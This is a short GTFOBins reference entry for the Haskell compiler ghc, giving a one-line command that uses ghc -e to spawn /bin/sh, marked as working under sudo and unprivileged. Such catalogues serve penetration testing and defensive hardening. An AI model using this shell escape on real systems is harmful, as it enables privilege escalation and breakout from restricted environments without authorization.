<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ghc -->
---
functions:
  shell:
  - code: |-
      ghc -e 'System.Process.callCommand "/bin/sh"'
    contexts:
      sudo:
      unprivileged:
...
